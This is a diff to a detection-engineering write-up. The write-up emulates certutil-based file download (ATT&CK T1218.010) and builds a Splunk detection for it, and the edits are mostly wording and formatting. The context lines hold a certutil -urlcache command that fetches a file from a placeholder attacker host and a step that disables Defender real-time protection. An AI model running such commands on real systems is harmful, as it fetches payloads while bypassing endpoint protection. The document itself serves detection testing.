@@ -11,7 +11,7 @@ ATT&CK: T1218.010 – Signed Binary Proxy Execution (certutil)
 
 | Source | Details |
 |--------|---------|
-| Sysmon | EventID 1 (Process Creation) |
+| Sysmon | EventID 1 - Process Creation |
 
 ---
 
@@ -37,7 +37,7 @@ echo test > harmless.txt && python3 -m http.server 8001
 
 ![Turn off real time protection](screenshots/d01_img3.png)
 
-4. Run the following command to retrieval the harmless file
+4. Run the following command to retrieve the harmless file
 ```powershell
 certutil -urlcache -split -f http://<attacker_ip>:8001/harmless.txt C:\Temp\harmless.txt
 ```
@@ -87,6 +87,8 @@ Image="*\\certutil.exe*"
 - Windows defender will block the execution of certutil in this setting unless temporarily disasbled
 - Defender also blocks execution when grabbing the file from localhost
 
+---
+
 ### False Positives
 
 - Rare testing/admin tasks
@@ -97,6 +99,8 @@ Image="*\\certutil.exe*"
 - Whitelist trusted admin accounts/hosts
 - Understand baseline certutil usage within your network -> refine query 
 - Restrict detections to combined use of -urlcache with unexpected domains
+
+---
 
 ### Quick Playbook
 On detection:
@@ -110,10 +114,10 @@ On detection:
 
 ### Status
 
-- Initial Test blocked by Defender
-- Test verified with defender disabled
-- Detection verified in Splunk
-- Ready for production
+- ✅ Initial Test blocked by Defender
+- ✅ Test validated in Splunk
+- ✅ Test evidence captured
+- ✅ Production ready
 
 
 
